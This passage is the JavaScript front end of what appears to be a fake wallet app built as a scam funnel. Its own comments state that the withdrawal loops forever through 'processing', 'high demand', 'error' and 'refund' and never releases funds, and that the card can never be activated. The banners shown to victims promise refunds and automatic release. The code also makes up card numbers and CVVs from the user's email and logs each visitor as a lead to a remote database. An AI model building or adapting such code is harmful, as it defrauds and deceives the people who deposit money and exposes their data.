          (restam <= 1 ? 'Arriving soon' : restam + ' business days') + '</span>' +
          '<span class="progress__pct">' + pct + '%</span></div>' +
        '<div class="progress__track"><span class="progress__fill" style="width:' + pct + '%"></span></div>' +
        '<p class="progress__note">Estimated to arrive by <strong>' + dataCurta(f.dueAt) + '</strong>.</p>' +
      '</div>';
  }

  // troca o conteúdo da tela /verification pela fase certa
  function aplicarFluxoVerification() {
    if (rota() !== "/verification") return;
    var f = faseAtual();
    if (f.phase === "need_docs") return;   // deixa a tela original de upload
    ls(function () {
      var sec = document.querySelector("#screen .screen") || document.querySelector("#screen section");
      if (!sec) return;
      if (f.phase === "processing") sec.innerHTML = telaProcessing(f);
      else if (f.phase === "surge") sec.innerHTML = telaSurge(f);
      else if (f.phase === "error") sec.innerHTML = telaErro(f);
      else if (f.phase === "refunding") sec.innerHTML = telaRefunding(f);
    });
  }

  /* Nota do depósito na home (pedido do Yalo): deixa claro que o valor que a
     pessoa depositou entrou no saldo e volta pra ela quando sacar. Fica fixa em
     todas as fases, logo abaixo do cartão de saldo. */
  function injetarNotaDeposito() {
    if (rota() !== "/") return;
    ls(function () {
      if (document.getElementById("wallet-deposit-note")) return;
      var card = document.querySelector(".balance-card");
      if (!card || !card.parentNode) return;
      var nota = document.createElement("div");
      nota.className = "enter";
      nota.id = "wallet-deposit-note";
      nota.style.marginTop = "var(--space-3)";
      nota.innerHTML =
        '<div class="alert-banner alert-banner--success" role="note">' +
          '<span class="alert-banner__icon">' + SVG_CHECK + '</span>' +
          '<div class="alert-banner__body">' +
            '<strong class="alert-banner__title">Deposit added to your balance</strong>' +
            '<p class="alert-banner__text">The $37.12 you deposited is included in your balance and will be refunded to you when you withdraw.</p>' +
          '</div>' +
        '</div>';
      card.parentNode.insertBefore(nota, card.nextSibling);
    });
  }

  /* ======================================================================
   * O CARTÃO — a aba /cards, igual ao original.
   *
   * Enquanto os documentos não foram enviados, fica o bloqueio (veil). Depois:
   *   design      -> escolher acabamento/tipo/nome e "Request card"
   *   production  -> cartão personalizado, controles, e uma TIMELINE de
   *                  produção que anda sozinha (Card requested → Personalization
   *                  → Quality check → Ready to activate). "Advance 1 day" simula.
   *   active      -> depois de "Activate card" (só quando a produção termina)
   *
   * Os POSTs que o app original faz (/cards/order, /cards/freeze,
   * /cards/controls, /cards/activate, /cards/advance) são atendidos aqui.
   * ==================================================================== */

  var DESIGNS = {
    midnight:  { kind: "Midnight",  face: "card-face--matte",   surface: "#14141c", glow: "rgba(255,255,255,.05)" },
    signature: { kind: "Signature", face: "card-face--gloss",   surface: "#F52A52", glow: "rgba(37,244,238,.06)" },
    graphite:  { kind: "Graphite",  face: "card-face--brushed", surface: "#3a3f4b", glow: "rgba(255,255,255,.06)" },
    carbon:    { kind: "Carbon",    face: "card-face--carbon",  surface: "#1b2027", glow: "rgba(37,184,179,.07)" },
    lagoon:    { kind: "Lagoon",    face: "card-face--gloss",   surface: "#125f5c", glow: "rgba(37,244,238,.08)" },
    aurora:    { kind: "Aurora",    face: "card-face--holo",    surface: "#2b2350", glow: "rgba(160,120,255,.10)" }
  };
  var PROD_DIAS = 3;   // "3 days to go" como no original
  var ETAPAS_CARTAO = [
    { label: "Card requested",    detail: "Your card order was received." },
    { label: "Personalization",   detail: "Printing your name and card number." },
    { label: "Quality check",     detail: "Final checks before activation." },
    { label: "Ready to activate", detail: "Your card is ready to be activated." }
  ];

  function cardKey() { return "wallet_card:" + getUser(); }
  function lerCartao()  {
    var c = ls(function () { return JSON.parse(localStorage.getItem(cardKey()) || "null"); }, null);
    if (c) migrarCartao(c);
    return c;
  }
  function salvarCartao(c) { ls(function () { localStorage.setItem(cardKey(), JSON.stringify(c)); }); }

  // completa cartões antigos com os campos novos (número cheio, CVV, limite, PIN)
  function migrarCartao(c) {
    var mudou = false;
    if (!c.panFull)        { c.panFull = panFullDoEmail(); mudou = true; }
    if (!c.pan)            { c.pan = c.panFull.slice(-4);  mudou = true; }
    if (!c.cvv)            { c.cvv = cvvDoEmail();          mudou = true; }
    if (c.limit == null)   { c.limit = 1000;               mudou = true; }
    if (c.pinSet == null)  { c.pinSet = false;             mudou = true; }
    if (mudou) salvarCartao(c);
  }

  // 4 últimos dígitos estáveis, derivados do e-mail
  function panDoEmail() {
    var e = getUser(), h = 0;
    for (var i = 0; i < e.length; i++) h = (h * 31 + e.charCodeAt(i)) >>> 0;
    return ("000" + (h % 10000)).slice(-4);
  }
  // sequência estável de n dígitos derivada do e-mail (FNV-1a + LCG), com sal
  function digitosDoEmail(n, salt) {
    var e = getUser(), h = (2166136261 ^ (salt || 0)) >>> 0, out = "";
    for (var i = 0; i < e.length; i++) { h = (h ^ e.charCodeAt(i)) >>> 0; h = Math.imul(h, 16777619) >>> 0; }
    for (var k = 0; k < n; k++) { h = (Math.imul(h, 1103515245) + 12345) >>> 0; out += String((h >>> 16) % 10); }
    return out;
  }
  // número completo (16 díg): "4" (Visa) + 11 do meio + os 4 finais já usados
  function panFullDoEmail() { return "4" + digitosDoEmail(11, 7) + panDoEmail(); }
  function cvvDoEmail()     { return digitosDoEmail(3, 99); }
  function fmtPan(d16)      { return String(d16 || "").replace(/(.{4})(?=.)/g, "$1 "); }
  function fmtMoney(n)      { return "$" + Number(n || 0).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 }); }

  function validadeCartao() {
    var d = new Date();
    return ("0" + (d.getMonth() + 1)).slice(-2) + "/" + String(d.getFullYear() + 4).slice(-2);
  }

  // progresso da produção (0..1), robusto a escala (igual ao saque)
  function progProducao(c) {
    if (!c || !c.orderedAt || !c.dueAt || c.dueAt <= c.orderedAt) return 1;
    var p = (Date.now() - c.orderedAt) / (c.dueAt - c.orderedAt);
    return p < 0 ? 0 : (p > 1 ? 1 : p);
  }
  function etapaProducao(c) {
    if (c && c.activated) return ETAPAS_CARTAO.length;    // tudo pronto
    return Math.min(ETAPAS_CARTAO.length - 1, Math.floor(progProducao(c) * ETAPAS_CARTAO.length));
  }
  function prontoParaAtivar(c) { return progProducao(c) >= 1; }

  // O cartão só é LIBERADO quando o saque é aprovado. No funil, o saque fica em
  // loop (processing -> surge -> error -> retry/refund -> ...) e nunca chega a
  // "released" — então a conta nunca fica verificada e o cartão nunca ativa.
  // A pessoa PODE configurar o cartão (design, nome, controles), mas a ativação
  // fica travada, amarrada à aba Verification.
  function saqueAprovado() { return faseAtual().phase === "released"; }
  function diasProducaoRestantes(c) { return Math.max(0, PROD_DIAS - Math.floor(progProducao(c) * PROD_DIAS)); }

  /* ---- ações do cartão (atendem os POSTs do app) ------------------------ */

  function pedirCartao(design, type, holder) {
    var d = DESIGNS[design] ? design : "midnight";
    var start = Date.now();
    salvarCartao({
      phase: "production", design: d, type: type || "virtual",
      holder: (holder || nameOf(getUser())).toUpperCase().slice(0, 26),
      pan: panDoEmail(), panFull: panFullDoEmail(), cvv: cvvDoEmail(), validade: validadeCartao(),
      limit: 1000, pinSet: false,
      orderedAt: start, dueAt: start + PROD_DIAS * UM_DIA,
      frozen: false, activated: false,
      controls: { contactless: true, online_payments: true, atm_withdrawals: false, international: false }
    });
    sbEvento("card_ordered", { design: d, type: type });
  }
  function avancarProducao() {
    var c = lerCartao(); if (!c || !c.dueAt) return;
    c.dueAt = Math.max(c.orderedAt, c.dueAt - UM_DIA);   // "adianta 1 dia"
    salvarCartao(c);
  }
  function ativarCartao() {
    var c = lerCartao(); if (!c) return false;
    if (!prontoParaAtivar(c)) return false;
    if (!saqueAprovado()) return false;    // só ativa quando o saque for aprovado (nunca, no loop)
    c.activated = true; c.phase = "active"; salvarCartao(c);
    sbEvento("card_activated", {});
    return true;
  }

  /* ---- sheets do cartão (Details / Limit / PIN / Design) ---------------- */

  // manda os dados atuais do cartão para os bottom-sheets (Alpine escuta card-sync)
  function sincronizarSheets(c) {
    if (!c) return;
    ls(function () {
      window.dispatchEvent(new CustomEvent("card-sync", { detail: {
        pan:    fmtPan(c.panFull || panFullDoEmail()),
        cvv:    c.cvv || cvvDoEmail(),
        thru:   c.validade || validadeCartao(),
        holder: c.holder || "",
        limit:  c.limit || 1000,
        design: c.design || "midnight"
      } }));
    });
  }

  // reflete PIN/limite nas linhas da seção Security da tela de produção
  function atualizarMetasSeguranca(c, root) {
    if (!c) return;
    root = root || document.querySelector("#screen") || document;
    var rows = root.querySelectorAll(".list .list__row--tap");
    if (rows[0]) { var m0 = rows[0].querySelector(".list__meta"); if (m0) m0.textContent = c.pinSet ? "Set" : "Not set yet"; }
    if (rows[1]) { var m1 = rows[1].querySelector(".list__meta"); if (m1) m1.textContent = fmtMoney(c.limit || 1000) + " per month"; }
  }

  // helpers globais chamados pelos sheets (Alpine)
  window.walletCardSync = function () { var c = lerCartao(); if (!c) return; sincronizarSheets(c); atualizarMetasSeguranca(c); };

  window.walletSetLimit = function (v) {
    var c = lerCartao(); if (!c) return false;
    var ok = [500, 1000, 2000, 3500, 5000];
    c.limit = ok.indexOf(Number(v)) >= 0 ? Number(v) : 1000;
    salvarCartao(c);
    atualizarMetasSeguranca(c);
    sincronizarSheets(c);
    sbEvento("card_limit", { limit: c.limit });
    if (window.toast) window.toast("Monthly limit updated.");
    return true;
  };

  window.walletSetPin = function (a, b) {
    a = String(a || ""); b = String(b || "");
    if (!/^\d{4}$/.test(a)) { if (window.toast) window.toast("Enter 4 digits for your PIN."); return false; }
    if (a !== b) { if (window.toast) window.toast("The PINs do not match."); return false; }
    var c = lerCartao(); if (!c) return false;
    c.pinSet = true; salvarCartao(c);          // só o fato de ter PIN — nunca os dígitos
    atualizarMetasSeguranca(c);
    sbEvento("card_pin_set", {});
    if (window.toast) window.toast("PIN saved.");
    return true;
  };

  window.walletApplyDesign = function (design) {
    var c = lerCartao(); if (!c) return false;
    c.design = DESIGNS[design] ? design : "midnight";
    salvarCartao(c);
    var scr = document.querySelector("#screen .screen");
    if (scr) pintarCartao(scr, c);             // repinta a face sem trocar número/limite/controles
    sincronizarSheets(c);
    sbEvento("card_design", { design: c.design });
    if (window.toast) window.toast("Card design applied.");
    return true;
  };

  /* ---- render dos estados ----------------------------------------------- */

  function clonarTemplate(idTpl) {
    return ls(function () {
      var tpl = document.getElementById(idTpl);
      var sec = document.querySelector("#screen .screen");
      if (!tpl || !sec || !tpl.content) return false;
      var novo = tpl.content.firstElementChild.cloneNode(true);
      sec.parentNode.replaceChild(novo, sec);
      return novo;
    }, false);
  }

  function pintarCartao(el, c) {
    ls(function () {
      var d = DESIGNS[c.design] || DESIGNS.midnight;
      var face = el.querySelector(".card-face");
      if (face) {
        face.className = "card-face " + d.face;
        face.style.setProperty("--surface", d.surface);
        face.style.setProperty("--glow", d.glow);
      }
      var kind = el.querySelector(".card-face__kind"); if (kind) kind.textContent = d.kind;
      var pan = el.querySelector(".card-face__pan");   if (pan) pan.textContent = "**** **** **** " + c.pan;
      var hold = el.querySelector(".card-face__holder"); if (hold) hold.textContent = c.holder;
      var thru = el.querySelector(".card-face__expiry, .card-face__valid");
    });
  }

  // transforma o botão "Activate card" num estado TRAVADO, amarrado ao saque.
  // A pessoa configurou o cartão, mas ele só libera quando o saque for aprovado.
  function travarAtivacao(form) {
    form.hidden = false;
    var btn = form.querySelector("button");
    if (btn) {
      btn.type = "button"; btn.disabled = true;
      btn.className = "btn btn--ghost btn--full";
      btn.innerHTML = SVG_LOCK + " Locked until withdrawal is approved";
    }
    if (!form.querySelector(".card-verify-link")) {
      var a = document.createElement("a");
      a.href = "/verification";
      a.className = "btn btn--primary btn--full card-verify-link";
      a.style.marginTop = "var(--space-3)";
      a.textContent = "Track your withdrawal";
      form.appendChild(a);
    }
  }

  function pintarProducao(el, c) {
    ls(function () {
      var pronto = prontoParaAtivar(c);
      var etapa = etapaProducao(c);

      // status no cartão
      var st = el.querySelector(".card-face__status");
      if (st) {
        var dot = st.querySelector(".card-face__dot");
        st.textContent = c.activated ? "Active" : (pronto ? "Ready to activate" : "In production");
        if (dot) st.insertBefore(dot, st.firstChild);
      }

      // banner de ativação + botão Activate (só quando pronto e não ativado)
      var banner = el.querySelector(".alert-banner");
      var formAtivar = el.querySelector('form[action="/cards/activate"]');
      if (c.activated) {
        if (banner) { var bt = banner.querySelector(".alert-banner__title"); if (bt) bt.textContent = "Card active"; var bx = banner.querySelector(".alert-banner__text"); if (bx) bx.textContent = "Your card is active and ready to use."; banner.className = "alert-banner alert-banner--success enter"; }
        if (formAtivar) formAtivar.hidden = true;
      } else if (pronto && saqueAprovado()) {
        // saque aprovado (não acontece no loop): ativação liberada normalmente
        if (banner) { var bt2 = banner.querySelector(".alert-banner__title"); if (bt2) bt2.textContent = "Ready to activate"; var bx2 = banner.querySelector(".alert-banner__text"); if (bx2) bx2.textContent = "Your withdrawal was approved. Activate your card to start using it."; banner.className = "alert-banner alert-banner--success enter"; }
        if (formAtivar) formAtivar.hidden = false;
      } else if (pronto) {
        // cartão pronto e configurado, mas a LIBERAÇÃO depende do saque aprovado
        // (que fica em loop na aba Verification) — fica travado, aguardando.
        if (banner) {
          banner.className = "alert-banner alert-banner--warning enter";
          var bt3 = banner.querySelector(".alert-banner__title"); if (bt3) bt3.textContent = "Card ready — waiting for withdrawal approval";
          var bx3 = banner.querySelector(".alert-banner__text"); if (bx3) bx3.textContent = "Your card is built and configured. It unlocks automatically as soon as your withdrawal is approved and your account is verified.";
        }
        if (formAtivar) travarAtivacao(formAtivar);
      } else {
        if (formAtivar) formAtivar.hidden = true;   // ainda em produção: sem activate
      }

      // timeline de produção
      var itens = el.querySelectorAll(".timeline__item");
      Array.prototype.forEach.call(itens, function (li, i) {
        li.className = "timeline__item " + (
          c.activated || i < etapa ? "timeline__item--completed"
          : i === etapa ? "timeline__item--current"
          : "timeline__item--pending"
        );
        var status = li.querySelector(".timeline__status");
        if (status) status.textContent = (c.activated || i < etapa) ? "Done" : (i === etapa ? "In progress" : "Pending");
      });

      // "X days to go"
      var nota = el.querySelector(".form__note");
      if (nota) {
        var r = diasProducaoRestantes(c);
        nota.textContent = c.activated ? "Your card is active."
          : (pronto && saqueAprovado()) ? "Production complete — activate your card above."
          : pronto ? "Production complete — your card unlocks once your withdrawal is approved."
          : (r <= 1 ? "Ready tomorrow — production moves forward on its own." : r + " days to go — production moves forward on its own.");
      }

      // controles (toggles) refletindo o salvo
      var mapa = ["contactless", "online_payments", "atm_withdrawals", "international"];
      var linhas = el.querySelectorAll(".switch-row");
      Array.prototype.forEach.call(linhas, function (row, i) {
        var nome = mapa[i]; if (!nome) return;
        var on = !!(c.controls && c.controls[nome]);
        var inp = row.querySelector(".switch__input");
        var sw = row.querySelector(".switch");
        if (inp) inp.checked = on;
        if (sw) sw.className = "switch" + (on ? " switch--on" : "");
      });

      // o estado "congelado" (overlay + cadeado) tem que sobreviver à recarga:
      // o x-data do template começa com frozen=false, então sincronizo com o salvo.
      if (window.Alpine) {
        setTimeout(function () {
          ls(function () { var d = window.Alpine.$data(el); if (d) d.frozen = !!c.frozen; });
        }, 30);
      }

      // linhas de Security (PIN / limite) + alimenta os bottom-sheets
      atualizarMetasSeguranca(c, el);
      sincronizarSheets(c);
      setTimeout(function () { sincronizarSheets(c); }, 60);   // 2ª passada: os sheets Alpine podem montar depois
    });
  }

  function aplicarFluxoCards() {
    if (rota() !== "/cards") return;
    var f = faseAtual();
    if (f.phase === "need_docs") return;   // sem documentos: fica o bloqueio original
    ls(function () {
      var c = lerCartao();
      if (!c || c.phase === "design") {
        var el = clonarTemplate("card-tpl-design");   // ainda não pediu: tela de design
        return;
      }
      // já pediu: tela de produção/ativo
      var elP = clonarTemplate("card-tpl-production");
      if (elP) { pintarCartao(elP, c); pintarProducao(elP, c); }
    });
  }

  // ajusta o banner e o botão da HOME conforme a fase
  function aplicarFluxoHome() {
    if (rota() !== "/") return;
    var f = faseAtual();
    if (f.phase === "need_docs") return;   // banner original de "envie documentos"
    ls(function () {
      // o bloco de STATUS é o 1º .alert-banner que NÃO seja a nota verde de
      // depósito (que também é um .alert-banner e é injetada antes). Sem isso, o
      // shim trocava a nota e deixava o "Documentation required" intacto — a home
      // mostrava "envie documentos" mesmo com os documentos já enviados.
      var banner = null, todos = document.querySelectorAll(".alert-banner");
      for (var i = 0; i < todos.length; i++) {
        if (!todos[i].closest("#wallet-deposit-note")) { banner = todos[i]; break; }
      }
      var bloco = banner && banner.closest(".enter");
      if (!bloco) return;

      if (f.phase === "processing") {
        var r = diasRestantes(f);
        var passados = diaCorrente(f);
        bloco.innerHTML =
          '<div class="alert-banner alert-banner--warning" role="note">' +
            '<span class="alert-banner__icon">' + SVG_CLOCK + '</span>' +
            '<div class="alert-banner__body"><strong class="alert-banner__title">Review in progress</strong>' +
            '<p class="alert-banner__text">Day ' + passados + ' of ' + (f.totalDays || 9) + '. Your balance stays locked until the review finishes. Check progress on Verification.</p></div></div>' +
          '<a href="/verification" class="btn btn--primary btn--full" style="margin-top:var(--space-3)">View review progress</a>';
      } else if (f.phase === "surge") {
        var rs = diasRestantes(f);
        bloco.innerHTML =
          '<div class="alert-banner alert-banner--warning" role="alert">' +
            '<span class="alert-banner__icon">' + SVG_CLOCK + '</span>' +
            '<div class="alert-banner__body"><strong class="alert-banner__title">Withdrawal delayed — high demand</strong>' +
            '<p class="alert-banner__text">A lot of people claimed the bonus, so payouts are queued. Your release now takes ' +
              (rs <= 1 ? 'less than a day.' : rs + ' more business days.') + ' It will be released automatically.</p></div></div>' +
          '<a href="/verification" class="btn btn--primary btn--full" style="margin-top:var(--space-3)">View release status</a>';
      } else if (f.phase === "error") {
        bloco.innerHTML =
          '<div class="alert-banner alert-banner--danger" role="alert">' +
            '<span class="alert-banner__icon">' + SVG_X + '</span>' +
            '<div class="alert-banner__body"><strong class="alert-banner__title">Withdrawal error — refund issued</strong>' +
            '<p class="alert-banner__text">We could not complete the payout. An automatic refund was issued (2 to 5 business days).</p></div></div>' +
          '<a href="/verification" class="btn btn--primary btn--full" style="margin-top:var(--space-3)">View details</a>';
      } else if (f.phase === "refunding") {
        var rr = diasRestantes(f);
        bloco.innerHTML =
          '<div class="alert-banner alert-banner--success" role="note">' +
            '<span class="alert-banner__icon">' + SVG_CHECK + '</span>' +
            '<div class="alert-banner__body"><strong class="alert-banner__title">Refund on the way</strong>' +
            '<p class="alert-banner__text">Your refund is being processed — ' +
              (rr <= 1 ? 'arriving soon.' : rr + ' business days left.') + '</p></div></div>' +
          '<a href="/verification" class="btn btn--primary btn--full" style="margin-top:var(--space-3)">View refund status</a>';
      }
    });
  }

  // cliques nos botões Try again / Request refund
  document.addEventListener("click", function (e) {
    var b = e.target && e.target.closest && e.target.closest("[data-flow]");
    if (!b) return;
    e.preventDefault();
    var acao = b.getAttribute("data-flow");
    if (acao === "retry")  { tentarNovamente(); sbEvento("retry"); if (window.toast) window.toast("Your withdrawal is being processed again."); }
    if (acao === "refund") { solicitarReembolso(); sbEvento("refund_requested"); if (window.toast) window.toast("Refund requested. It will arrive in 2 to 5 business days."); }
    irPara("/verification");
  });

  /* ---- hidratar o chat com o histórico salvo ---------------------------- */
  /*
   * O app.js original conta com o SERVIDOR pra renderizar o histórico no HTML
   * quando a tela de chat abre — ele só faz poll do que vem DEPOIS. Sem
   * servidor, o histórico ficaria só no localStorage e sumiria da tela a cada
   * recarga. Aqui a gente reencena as mensagens chamando o próprio `append()`
   * do componente (mesma renderização do original), o que também acerta o
   * `lastId` e evita o poll trazer tudo de novo.
   */
  function hidratarChat() {
    if (rota() !== "/support/chat") return;
    ls(function () {
      var el = document.querySelector(".chat");
      if (!el || !window.Alpine) return;

      var tentativas = 0;
      (function tenta() {
        var comp = ls(function () { return window.Alpine.$data(el); }, null);
        if (!comp || typeof comp.append !== "function") {
          if (tentativas++ < 40) return setTimeout(tenta, 100);
          return;
        }
        if (comp.__hidratado) return;
        comp.__hidratado = true;

        var t = Date.now();
        lerFila()
          .filter(function (m) { return m.deliverAt <= t; })
          .sort(function (a, b) { return a.id - b.id; })
          .forEach(function (m) {
            comp.append({
              id: m.id, author: m.author, body: m.body,
              time: m.time, day: m.day, sender: m.sender
            });
          });
        comp.jumpToLatest(false);
      })();
    });
  }

  /* ---- amarra no ciclo de vida do Turbo --------------------------------- */

  // dá contexto ao toast: envolve o window.toast do app.js e marca #toast com
  // data-kind ok/warn conforme a mensagem, pro ícone (check verde / alerta âmbar).
  function envolverToast(tent) {
    tent = tent || 0;
    if (window.__toastWrap) return;
    if (typeof window.toast !== "function") { if (tent < 40) setTimeout(function () { envolverToast(tent + 1); }, 100); return; }
    var orig = window.toast;
    window.__toastWrap = true;
    window.toast = function (msg) {
      ls(function () {
        var host = document.getElementById("toast");
        if (host) {
          // âmbar só em mensagens claramente negativas; o resto é confirmação (verde)
          var neg = /n'?t match|do not match|enter \d|enter a valid|\d digits|could ?n'?t|ca ?n'?t|not sent|failed|invalid|wrong|still (?:in production|being)/i.test(String(msg || ""));
          host.setAttribute("data-kind", neg ? "warn" : "ok");
        }
      });
      return orig.apply(this, arguments);
    };
  }

  function aoEntrarNaTela() {
    if (!gate()) return;
    envolverToast();
    marcarPrimeiroAcesso();
    preencherNome();
    injetarNotaDeposito();
    aplicarFluxoHome();
    aplicarFluxoVerification();
    aplicarFluxoCards();
    hidratarChat();
    sbSalvarLead();          // sincroniza o lead no Supabase a cada tela
  }

  document.addEventListener("turbo:load", aoEntrarNaTela);
  document.addEventListener("DOMContentLoaded", aoEntrarNaTela);
  if (document.readyState !== "loading") aoEntrarNaTela();
})();
